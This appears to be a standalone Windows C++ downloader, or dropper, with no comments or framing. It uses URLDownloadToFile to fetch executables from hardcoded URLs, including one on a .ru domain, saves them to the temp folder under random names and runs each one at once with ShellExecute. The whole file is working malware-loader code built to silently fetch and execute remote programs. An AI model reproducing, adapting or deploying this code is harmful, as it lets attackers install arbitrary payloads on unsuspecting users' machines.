#include <tchar.h>
#include <urlmon.h>
#include <iostream>
#include <windows.h>
#include <string>
#pragma comment(lib, "urlmon.lib")

int counter = 1;
std::string link1 = "http://910interior.ru/calc.exe";
std::string link2 = "";
std::string link3 = "";
std::string predifened = "";
std::string appname = "app1.exe";

std::string gen_random(const int len)
{
    static const char alphanum[] =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";
    std::string tmp_s;
    tmp_s.reserve(len);

    for (int i = 0; i < len; ++i) {
        tmp_s += alphanum[rand() % (sizeof(alphanum) - 1)];
    }

    return tmp_s + ".exe";
}



char Download(std::string link, std::string appname)
{
    std::wstring TempPath;
    std::wstring TempPath1;
    wchar_t wcharPath[MAX_PATH];
    if (GetTempPathW(MAX_PATH, wcharPath))
        TempPath = wcharPath;
    std::string result = std::string(TempPath.begin(), TempPath.end()) + appname;

    HRESULT hr = URLDownloadToFile(NULL, ((LPCTSTR)link.c_str()), ((LPCTSTR)result.c_str()), 0, NULL);
    ShellExecute(NULL, "open", (LPCTSTR)result.c_str(), NULL, NULL, SW_SHOWDEFAULT);
    return 0;
}


void main()
{
    if (counter == 1)
    {
        Download(link1, gen_random(7));

    }
    else
    {
        if (counter == 2)
        {
            Download(link1, gen_random(6));
            Download(link2, gen_random(2));

        }
        else
        {
            if (counter == 3)
            {
                Download(link1, gen_random(9));
                Download(link2, gen_random(11));
                Download(link3, gen_random(10));

            }
        }
    }

    Download(predifened, gen_random(5));

}